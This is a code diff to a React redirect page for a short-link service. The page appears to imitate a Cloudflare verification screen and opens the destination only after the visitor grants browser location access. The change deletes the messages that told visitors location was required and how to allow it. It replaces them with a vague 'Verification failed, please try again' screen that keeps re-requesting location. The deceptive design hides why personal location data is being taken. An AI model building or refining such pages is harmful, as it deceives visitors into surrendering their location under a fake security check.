@@ -89,6 +89,27 @@ export default function RedirectPage() {
     })();
   }, [code, requestLocation]);
 
+  // Uniform failure look for every failure type (denied, timeout, unsupported)
+  if (status === "blocked" || status === "unsupported") {
+    return (
+      <CfShell hostname={hostname} rayId={rayId}>
+        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
+        <p className="cf-sub">
+          Verification could not be completed. Please try again.
+        </p>
+        <Widget state="error" />
+        <div>
+          <button
+            className="cf-retry"
+            onClick={() => requestLocation(link.url_id, link.destination_url)}
+          >
+            Try again
+          </button>
+        </div>
+      </CfShell>
+    );
+  }
+
   if (status === "notfound") {
     return (
       <CfShell hostname={hostname} rayId={rayId}>
@@ -97,50 +118,6 @@ export default function RedirectPage() {
           <p className="cf-sub" style={{ marginTop: 8 }}>
             {errorMsg || "This short link does not exist."}
           </p>
-        </div>
-      </CfShell>
-    );
-  }
-
-  if (status === "unsupported") {
-    return (
-      <CfShell hostname={hostname} rayId={rayId}>
-        <div className="cf-box">
-          <h2>Location not supported</h2>
-          <p className="cf-sub" style={{ marginTop: 8 }}>
-            Your browser does not support location access, so this link cannot
-            be opened. Please try a modern browser like Chrome.
-          </p>
-        </div>
-      </CfShell>
-    );
-  }
-
-  if (status === "blocked") {
-    return (
-      <CfShell hostname={hostname} rayId={rayId}>
-        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
-        <p className="cf-sub">
-          Location access is required before this link can be opened.
-        </p>
-        <Widget state="error" />
-        <div className="cf-box">
-          <h2>📍 Location access required</h2>
-          <p className="cf-sub" style={{ marginTop: 8 }}>
-            This link can only be opened after you allow location access.
-          </p>
-          <p className="hint cf-hint-left">
-            If you clicked &quot;Block&quot;, click the padlock / site-settings icon in
-            your browser&apos;s address bar, set <strong>Location</strong> to
-            &quot;Allow&quot;, then tap the button below.
-          </p>
-          <button
-            className="btn"
-            style={{ marginTop: 16 }}
-            onClick={() => requestLocation(link.url_id, link.destination_url)}
-          >
-            Allow location to continue
-          </button>
         </div>
       </CfShell>
     );
